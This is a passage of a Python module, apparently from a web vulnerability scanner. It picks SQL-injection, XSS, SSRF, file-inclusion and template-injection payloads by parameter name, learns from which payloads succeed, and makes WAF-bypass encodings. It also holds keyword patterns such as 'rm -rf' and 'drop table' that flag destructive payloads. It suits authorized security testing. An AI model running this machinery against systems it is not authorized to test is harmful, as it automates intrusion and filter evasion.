        f"[payload-v2] feedback success bug={bug_type}"
        f" family={family or 'unknown'} payload_hash={ph}"
    )


def record_payload_failure(bug_type: str, payload: str,
                           reason: str = "", family: str = "") -> None:
    """
    Record that EIL validation rejected this payload (false positive).

    [payload-v2] feedback fail bug=... reason=...
    """
    ph = _ph(payload)
    try:
        with _FB_LOCK:
            db = _fb_db()
            db.execute("""
                INSERT INTO payload_feedback
                    (bug_type, payload_hash, payload_short, family,
                     fail_count, last_seen)
                VALUES (?,?,?,?,1,?)
                ON CONFLICT(bug_type, payload_hash) DO UPDATE SET
                    fail_count = fail_count + 1,
                    last_seen  = excluded.last_seen
            """, (bug_type, ph, payload[:60], family or "", int(time.time())))
            db.commit()
    except Exception as e:
        log.debug(f"[payload-v2] feedback fail write: {e}")

    try:
        from engine.learning import record_payload_try as _learn_try
        _learn_try(payload, bug_type)
    except Exception:
        pass

    log.info(f"[payload-v2] feedback fail bug={bug_type} reason={reason[:60]}")


def get_feedback_stats() -> Dict:
    """Return aggregate feedback statistics."""
    try:
        with _FB_LOCK:
            db = _fb_db()
            rows = db.execute("""
                SELECT bug_type,
                       SUM(success_count) as successes,
                       SUM(fail_count)    as failures,
                       COUNT(*)           as records
                FROM payload_feedback GROUP BY bug_type
            """).fetchall()
            total = db.execute("SELECT COUNT(*) FROM payload_feedback").fetchone()[0]
        return {
            "total_records": total,
            "by_bug_type":   {r["bug_type"]: {
                "successes": r["successes"],
                "failures":  r["failures"],
                "records":   r["records"],
            } for r in rows},
        }
    except Exception:
        return {"total_records": 0, "by_bug_type": {}}


# ── Context routing rules (Phase 4) ──────────────────────────────────────────

# ── Budget configuration — source allocation ratios per mode ─────────────────
# (payload_intel_pct, assetnote_pat_local_pct, constants_pct)
# These are the authoritative values read by select_payloads_v2 AND
# returned by the /payloads/v2/budget API route.
BUDGETS: Dict[str, tuple] = {
    "normal": (0.40, 0.40, 0.20),   # 40% intel | 40% pm | 20% const
    "deep":   (0.35, 0.50, 0.15),   # 35% intel | 50% pm | 15% const
    "lab":    (0.35, 0.50, 0.15),   # same ratios but lab_only included
}

CAPS: Dict[str, int] = {
    "normal": 30,
    "deep":   100,
    "lab":    200,
}


def select_safe_payloads(
    bug_type: str,
    mode:     str = "normal",
    limit:    int = None,
    url:      str = "",
    param:    str = "",
) -> List[Dict]:
    """
    Primary scanner-facing API: returns safe payloads bounded by mode cap.

    mode   cap    tiers
    normal  30    safe only
    deep   100    safe + low_risk
    lab    200    safe + low_risk + lab_only

    Logs:
      [payloads] selected bug=sqli mode=normal count=30 risk=safe
    """
    from engine.payload_intel import TIER_SAFE, TIER_LOW_RISK, TIER_LAB_ONLY
    _MODE_TIERS = {
        "normal": {"safe"},
        "deep":   {"safe", "low_risk"},
        "lab":    {"safe", "low_risk", "lab_only"},
    }
    cap   = CAPS.get(mode, CAPS["normal"])
    if limit is not None:
        cap = min(cap, limit)
    tiers = _MODE_TIERS.get(mode, {"safe"})

    # Use existing select_payloads_v2 — filter by allowed tiers
    all_payloads = select_payloads_v2(
        bug_type = bug_type,
        url      = url,
        param    = param,
        mode     = mode,
    )
    # Filter to allowed tiers only (normal mode enforces safe only)
    filtered = [p for p in all_payloads if p.get("risk_tier", "safe") in tiers][:cap]

    import logging as _log
    _log.getLogger("elite.payload_manager").info(
        f"[payloads] selected bug={bug_type} mode={mode}"
        f" count={len(filtered)} risk={'|'.join(sorted(tiers))}"
    )
    return filtered


def safe_payload_stats() -> Dict:
    """Return counts by bug_type, risk_tier, family, source for /payloads/safe/stats."""
    import sqlite3 as _sq
    try:
        from engine.payload_intel import _ensure_bootstrapped, _DB
        _ensure_bootstrapped()
        conn = _sq.connect(str(_DB), timeout=5, check_same_thread=False)
        stats: Dict = {"by_bug_type": {}, "by_risk_tier": {}, "by_family": {}, "total": 0}
        for row in conn.execute(
            "SELECT pf.bug_type, pv.safety_tier, pf.family_name, COUNT(*) as n "
            "FROM payload_variants pv JOIN payload_families pf ON pf.family_id=pv.family_id "
            "GROUP BY pf.bug_type, pv.safety_tier, pf.family_name"
        ).fetchall():
            bt, rt, fam, n = row
            stats["by_bug_type"][bt]   = stats["by_bug_type"].get(bt, 0)   + n
            stats["by_risk_tier"][rt]  = stats["by_risk_tier"].get(rt, 0)  + n
            stats["by_family"][fam]    = stats["by_family"].get(fam, 0)    + n
            stats["total"]             += n
        conn.close()
        return stats
    except Exception as e:
        # Fallback: count live from select_safe_payloads
        stats: Dict = {"by_bug_type": {}, "by_risk_tier": {}, "by_family": {},
                       "total": 0, "_source": "live_count"}
        for bt in ["xss","sqli","lfi","ssrf","ssti","open_redirect","crlf",
                   "cache_poison","rce","idor","xxe","cors","redirect"]:
            try:
                ps = select_payloads_v2(bt, mode="lab")
                if ps:
                    stats["by_bug_type"][bt] = len(ps)
                    stats["total"] += len(ps)
                    for p in ps:
                        rt  = p.get("risk_tier","safe")
                        fam = p.get("family", bt)
                        stats["by_risk_tier"][rt]  = stats["by_risk_tier"].get(rt,0)  + 1
                        stats["by_family"][fam]    = stats["by_family"].get(fam,0)    + 1
            except Exception: pass
        return stats

_CTX_ROUTES: Dict[str, Dict] = {

    "sqli": {
        "id|user_id|product_id|item_id|uid|pid":  ["sqli_time","sqli_union","sqli_error"],
        "sort|order|orderby|order_by":             ["sqli_error","sqli_union"],
        "search|q|query|keyword|filter|name":      ["sqli_error","sqli_auth_bypass"],
    },
    "ssrf": {
        "url|dest|destination|redirect|callback|"
        "webhook|endpoint|target|proxy|fetch|src": ["ssrf_cloud","ssrf_bypass","ssrf_internal"],
        "image|avatar|icon|photo|picture|thumb":   ["ssrf_internal","ssrf_bypass"],
        "file|import|export|download|upload":      ["ssrf_internal","ssrf_cloud"],
    },
    "xss": {
        "q|search|query|keyword|name|title|msg|"
        "message|comment|text|body|description":   ["xss_reflected","xss_waf","xss_polyglot"],
        "callback|jsonp|cb|ref":                   ["xss_polyglot","xss_dom"],
        "content|html|template|render|page":       ["xss_dom","xss_polyglot"],
    },
    "lfi": {
        "file|include|page|path|template|doc|"
        "document|load|read|content":              ["lfi_unix","lfi_bypass","lfi_win"],
        "lang|locale|language|l":                  ["lfi_unix","lfi_bypass"],
    },
    "ssti": {
        "template|render|view|preview|format|"
        "theme|layout|page|tpl":                   ["ssti_detect","ssti_jinja2"],
    },
    "redirect": {
        "redirect|next|return|return_url|callback|"
        "continue|dest|destination|url|goto|redir": ["redirect_open"],
    },
}

def _resolve_tags(bug_type: str, param: str) -> List[str]:
    """Map param name to ordered tag list using context routing rules."""
    rules = _CTX_ROUTES.get(bug_type, {})
    param_lower = param.lower()
    for pattern, tags in rules.items():
        if any(p == param_lower or param_lower.startswith(p)
               for p in pattern.split("|")):
            return tags
    # Fallback: use smart_rules defaults
    return _SMART_RULES.get(bug_type, {}).get("primary", [bug_type])


def _surface_from_url(url: str) -> str:
    """Guess response surface from URL path/extension."""
    u = url.lower()
    if any(u.endswith(e) for e in (".json",".xml",".api")):  return "json"
    if any(p in u for p in ["/api/","/v1/","/v2/","/rest/","/graphql"]): return "api"
    if any(u.endswith(e) for e in (".html",".htm",".php",".aspx",".jsp")): return "html"
    return "web"


# ── WAF encoding variants (Phase 6) ──────────────────────────────────────────

def _waf_variants(payload: str, waf_detected: bool = False,
                  status_hint: int = 200, deep: bool = False) -> List[str]:
    """
    Generate safe encoding variants when WAF indicators are present.
    Does NOT generate destructive payloads.
    Only activates when: waf_detected=True OR HTTP 403/406/429 OR deep=True.
    """
    if not (waf_detected or status_hint in (403, 406, 429) or deep):
        return [payload]  # no mutation in normal mode

    try:
        from engine.waf import apply_bypass
        strategies = ["url_encoding", "double_url_encode", "comment_injection"]
        seen: set = {payload}
        result: List[str] = [payload]
        for strat in strategies[:2]:   # cap at 2 strategies to avoid spray
            for v in apply_bypass(payload, strat):
                if v not in seen and len(result) < 5:
                    seen.add(v)
                    result.append(v)
        return result
    except Exception:
        return [payload]


# ── Unified v2 selector ───────────────────────────────────────────────────────

def select_payloads_v2(
    bug_type:   str,
    url:        str  = "",
    param:      str  = "",
    context:    dict = None,
    mode:       str  = "normal",   # "normal" | "deep" | "lab"
    _debug_out: dict = None,       # if provided, populated with internals for debug=1
) -> List[Dict]:
    """
    Payload Intelligence v2 — returns structured payload objects.

    Each object:
    {
      "payload":    str,
      "source":     "payload_intel|assetnote|pat|local|constant",
      "family":     "sqli_time",
      "risk_tier":  "safe|low|lab_only|manual",
      "confidence": 0.91,
      "reason":     "param=id + API endpoint + prior success"
    }

    Merge order: payload_intel → payload_manager → constants
    Source balancing (normal mode, 30 slots):
      • 40% (12) payload_intel  — ranked/DB/feedback
      • 40% (12) assetnote+PAT  — context-routed wordlists
      • 20%  (6) constants      — inline canonical fallback
      Remaining slots filled from whichever sources have more payloads.

    Logs:
      [payload-v2] bug=sqli param=id selected=30
                   distribution={payload_intel:12, assetnote:10, pat:5, constants:3}
                   mode=normal
    """
    ctx     = context or {}
    cap     = CAPS.get(mode, CAPS["normal"])
    waf_det = ctx.get("waf_detected", False)
    surface = _surface_from_url(url) if url else "web"

    # ── Slot budgets (per-mode percentages) ──────────────────────────────────
    # Budget config read from module-level BUDGETS dict (also served by /payloads/v2/budget)
    _bi, _bpm, _bc = BUDGETS.get(mode, BUDGETS["normal"])
    _budget_intel = max(1, int(cap * _bi))
    _budget_pm    = max(1, int(cap * _bpm))
    _budget_const = max(1, cap - _budget_intel - _budget_pm)

    # Resolve tag priority from context
    param_tags = _resolve_tags(bug_type, param)
    cache      = _ensure_cache()

    # ── Collect candidates per source INDEPENDENTLY (no shared seen_pl yet) ─────
    # Key insight: payload_intel, PAT, and inline heavily overlap in content.
    # Collecting with a shared dedup set causes payload_intel to consume all
    # slots before PAT/constants can contribute. Fix: collect each source
    # independently, then enforce budgets, THEN dedup at final merge.

    def _make_obj(payload: str, source: str, family: str,
                  confidence: float = 0.7, reason: str = "") -> Optional[Dict]:
        """Build payload object. Risk/lab check only — no dedup at collection time."""
        norm = payload.strip()
        if not norm:
            return None
        risk_tier = "safe"
        nl = norm.lower()
        if any(k in nl for k in ["sleep","waitfor","delay","benchmark"]):
            risk_tier = "low"
        if any(k in nl for k in ["rm -rf","drop table","shutdown"]):
            risk_tier = "lab_only"
        if risk_tier == "lab_only" and mode != "lab":
            return None
        obj: Dict = {
            "payload":    norm,
            "source":     source,
            "family":     family,
            "risk_tier":  risk_tier,
            "confidence": round(confidence, 3),
            "reason":     reason or f"param={param or 'any'} surface={surface}",
        }
        if mode == "lab" and risk_tier == "lab_only":
            obj["lab_marked"]  = True
            obj["lab_warning"] = "DO NOT use against production — lab/research only"
        return obj

    _by_source: Dict[str, List[Dict]] = {
        "payload_intel": [], "assetnote": [], "pat": [],
        "local": [], "constant": [],
    }

    # Layer 1: payload_intel — collect up to budget_intel * 3 candidates
    try:
        from engine.payload_intel import select_payloads as _pi_sel
        _pi_raw = _pi_sel(bug_type, top_n=_budget_intel * 3)
        for p in _pi_raw:
            obj = _make_obj(p, "payload_intel", bug_type, confidence=0.85,
                            reason=f"payload_intel ranked param={param or 'any'}")
            if obj:
                _by_source["payload_intel"].append(obj)
    except Exception:
        pass

    # Layer 1b: feedback-boosted (prepend to payload_intel)
    try:
        with _FB_LOCK:
            fb_rows = _fb_db().execute("""
                SELECT payload_short, family,
                       CAST(success_count AS REAL) /
                       MAX(1, success_count+fail_count) AS rate
                FROM payload_feedback
                WHERE bug_type=? AND success_count > 0
                ORDER BY rate DESC, success_count DESC LIMIT 20
            """, (bug_type,)).fetchall()
        for row in fb_rows:
            obj = _make_obj(row["payload_short"], "payload_intel",
                            row["family"] or bug_type,
                            confidence=min(0.98, 0.80 + row["rate"] * 0.18),
                            reason=f"feedback_boosted rate={row['rate']:.2f}")
            if obj:
                _by_source["payload_intel"].insert(0, obj)
    except Exception:
        pass

    # Layer 2a: assetnote (collect independently, no dedup against intel yet)
    for tag in param_tags[:3]:
        if tag not in _ASSETNOTE_SOURCES:
            continue
        for p in cache.get(tag, []):
            obj = _make_obj(p, "assetnote", tag, confidence=0.72,
                            reason=f"assetnote tag={tag}")
            if obj:
                _by_source["assetnote"].append(obj)

    # Layer 2b: PAT (collect independently)
    # For tags in _PAT_SOURCES: use cache (contains either network or local fallback data)
    # For other tags: use cache with "local" label
    for tag in param_tags[:3]:
        if tag in _PAT_SOURCES:
            src = "pat"
        elif tag in cache:
            src = "local"
        else:
            continue
        for p in cache.get(tag, []):
            obj = _make_obj(p, src, tag, confidence=0.70,
                            reason=f"{src} tag={tag}")
            if obj and src in _by_source:
                _by_source[src].append(obj)

    # Layer 3: inline constants (collect independently)
    for tag in list(param_tags) + [bug_type]:
        for p in _INLINE.get(tag, []):
            obj = _make_obj(p, "constant", tag, confidence=0.65,
                            reason=f"canonical_constant tag={tag}")
            if obj:
                _by_source["constant"].append(obj)

    # ── Budget-enforced merge ─────────────────────────────────────────────────
    # Each source independently selects its budget worth of payloads using
    # source-local dedup only. Final global dedup is applied at merge time.
    # This guarantees the 40/40/20 split is honoured even when sources overlap
    # in content — the source that gets budget credit is determined by the
    # tier it belongs to, not by uniqueness vs other sources.

    _src_local: Dict[str, List[Dict]] = {}  # source → budget-sized candidate list

    def _collect(source_key: str, budget: int) -> None:
        """Take up to budget payloads from _by_source[source_key], source-local dedup only."""
        seen_local: set = set()
        taken: List[Dict] = []
        for obj in _by_source.get(source_key, []):
            if len(taken) >= budget:
                break
            norm = obj["payload"]
            if norm not in seen_local:
                seen_local.add(norm)
                taken.append(obj)
        _src_local[source_key] = taken

    # Collect each source to its budget (source-local dedup, no cross-source filtering)
    _collect("payload_intel", _budget_intel)
    _collect("assetnote",     _budget_pm // 2)
    _collect("pat",           _budget_pm - (_budget_pm // 2))
    _collect("local",         min(2, _budget_pm))
    _collect("constant",      _budget_const)

    # Merge in tier order with global dedup — first seen wins the source label
    result:    List[Dict]    = []
    seen_out:  set           = set()
    _dist:     Dict[str,int] = {}

    def _merge(source_key: str) -> None:
        for obj in _src_local.get(source_key, []):
            norm = obj["payload"]
            if norm not in seen_out and len(result) < cap:
                seen_out.add(norm)
                result.append(obj)
                _dist[source_key] = _dist.get(source_key, 0) + 1

    _merge("payload_intel")
    _merge("assetnote")
    _merge("pat")
    _merge("local")
    _merge("constant")

    # Phase 2: overflow — remaining slots from sources OTHER than intel first,
    # then intel. This prevents intel from dominating the final output count.
    _overflow_used = False
    if len(result) < cap:
        _before_overflow = len(result)
        # Overflow priority: constants → pat → assetnote → local → intel (last)
        for src_key in ["constant", "pat", "assetnote", "local", "payload_intel"]:
            for obj in _by_source[src_key]:
                if len(result) >= cap:
                    break
                norm = obj["payload"]
                if norm not in seen_out:
                    seen_out.add(norm)
                    result.append(obj)
                    _dist[src_key] = _dist.get(src_key, 0) + 1
            if len(result) >= cap:
                break
        _overflow_used = len(result) > _before_overflow

    # WAF encoding variants (appended, don't count against main cap)
    if waf_det or mode == "deep":
        extras = []
        for obj in result[:5]:
            for v in _waf_variants(obj["payload"], waf_det, deep=(mode=="deep")):
                if v != obj["payload"]:
                    vobj = _make_obj(v, f"{obj['source']}+waf_enc", obj["family"],
                                     obj["confidence"] * 0.9,
                                     f"waf_variant of: {obj['payload'][:30]}")
                    if vobj and vobj["payload"] not in seen_out:
                        seen_out.add(vobj["payload"])
                        extras.append(vobj)
        result.extend(extras[:min(5, cap - len(result))])

    sources_str = "+".join(k for k in ["payload_intel","assetnote","pat",
                                        "local","constant"] if _dist.get(k,0) > 0)
    _target = {"intel": _budget_intel, "pm": _budget_pm, "const": _budget_const}
    _actual = {"intel": _dist.get("payload_intel",0),
               "pm": _dist.get("assetnote",0)+_dist.get("pat",0)+_dist.get("local",0),
               "const": _dist.get("constant",0)}
    log.info(
        f"[payload-v2] bug={bug_type} param={param or 'any'}"
        f" selected={len(result)}"
        f" distribution={_dist}"
        f" mode={mode}"
        f" surface={surface}"
    )
    log.info(
        f"[payload-v2] budget_applied mode={mode}"
        f" target={_target}"
        f" actual={_actual}"
        f" overflow={'yes' if _overflow_used else 'no'}"
    )

    # Populate debug internals if caller requested them
    if _debug_out is not None:
        # candidate_counts: how many each source had after budget cap (from _src_local)
        _cand = {k: len(v) for k, v in _src_local.items() if v}
        # available_counts: raw cache sizes before budget cap
        _avail = {
            "payload_intel": len(_by_source.get("payload_intel", [])),
            "assetnote":     len(_by_source.get("assetnote", [])),
            "pat":           len(_by_source.get("pat", [])),
            "local":         len(_by_source.get("local", [])),
            "constant":      len(_by_source.get("constant", [])),
        }
        _pre_dedup = {
            "payload_intel": len(_src_local.get("payload_intel", [])),
            "assetnote":     len(_src_local.get("assetnote", [])),
            "pat":           len(_src_local.get("pat", [])),
            "local":         len(_src_local.get("local", [])),
            "constant":      len(_src_local.get("constant", [])),
        }
        _pre_total  = sum(_pre_dedup.values())
        _final_total = len(result)
        _deduped    = _pre_total - _final_total

        _debug_out.update({
            "budget_target": {
                "payload_intel": _budget_intel,
                "assetnote_pat": _budget_pm,
                "constants":     _budget_const,
            },
            "available_counts":        {k: v for k, v in _avail.items() if v},
            "candidate_counts":        _cand,
            "pre_dedupe_distribution": _pre_dedup,
            "pre_dedupe_total":        _pre_total,
            "final_distribution":      dict(_dist),
            "dedupe_removed":          max(0, _deduped),
            "overflow_used":           _overflow_used,
            "cap":                     cap,
            "mode":                    mode,
        })

    return result


def payloads_v2_health() -> Dict:
    """Health check for Payload Intelligence v2."""
    stats  = get_stats()
    fb     = get_feedback_stats()
    return {
        "status":         "ok",
        "version":        "v2",
        "total_payloads": stats["total_payloads"],
        "total_tags":     stats["total_tags"],
        "by_bug_type":    stats["by_bug_type"],
        "sources": {
            "payload_intel_db":  "canonical H1-observed, confidence-scored, feedback-boosted",
            "assetnote":         "Assetnote wordlists (GitHub raw)",
            "pat":               "PayloadAllTheThings (GitHub raw)",
            "local":             "external_tools/payloads-main/*.txt",
            "constants":         "scanner.py XSS_PAYLOADS/SQLI_PAYLOADS/etc",
        },
        "feedback_records": fb["total_records"],
        "feedback_by_bug":  fb["by_bug_type"],
        "scanner_integrations": {
            "xss":      True,
            "sqli":     True,
            "ssrf":     True,
            "lfi":      True,
            "ssti":     True,
            "redirect": True,
            "merge_order":  "payload_intel → assetnote/PAT → constants",
            "dedup":        "order-preserving",
            "normal_cap":   30,
            "deep_cap":     100,
            "lab_cap":      200,
            "waf_variants": "generated when waf_detected=True or deep mode",
        },
        "tags": stats["tags"],
        "cache_age_s": stats["cache_age_s"],
    }


def get_budget_config() -> Dict:
    """Return the active budget configuration from module-level BUDGETS/CAPS."""
    result = {}
    for mode, (bi, bpm, bc) in BUDGETS.items():
        cap   = CAPS[mode]
        intel = max(1, int(cap * bi))
        pm    = max(1, int(cap * bpm))
        const = max(1, cap - intel - pm)
        result[mode] = {
            "cap":           cap,
            "payload_intel": {"slots": intel, "pct": round(bi  * 100)},
            "assetnote_pat": {"slots": pm,    "pct": round(bpm * 100)},
            "constants":     {"slots": const, "pct": round(bc  * 100)},
            "lab_only_included": mode == "lab",
            "waf_variants":      mode in ("deep", "lab"),
            "lab_warning": "lab_only payloads marked lab_marked=True" if mode == "lab" else None,
        }
    return result


def get_source_health() -> Dict:
    """
    Return current payload source health including per-file counts,
    failed fetches, and last error.
    """
    _ensure_cache()   # build if not yet built
    return {
        "files_found":      _SOURCE_HEALTH["files_found"],
        "files_found_count": len(_SOURCE_HEALTH["files_found"]),
        "files_missing":    _SOURCE_HEALTH["files_missing"],
        "lines_loaded":     _SOURCE_HEALTH["lines_loaded"],
        "tags_loaded":      sorted(_SOURCE_HEALTH["tags_loaded"]),
        "tags_loaded_count": len(_SOURCE_HEALTH["tags_loaded"]),
        "failed_sources":   _SOURCE_HEALTH["failed_sources"],
        "failed_count":     len(_SOURCE_HEALTH["failed_sources"]),
        "last_fetch_error": _SOURCE_HEALTH["last_fetch_error"],
        "last_build_ts":    _SOURCE_HEALTH["last_build_ts"],
        "local_base_path":  str(_LOCAL),
        "assetnote_path":   str(_ASSETNOTE),
        "pat_path":         str(_PAT),
        "network_sources":  {
            "assetnote_tags": len(_ASSETNOTE_SOURCES),
            "pat_tags":       len(_PAT_SOURCES),
            "note": "Network fetch failures fall back to local files — check failed_sources for details",
        },
    }
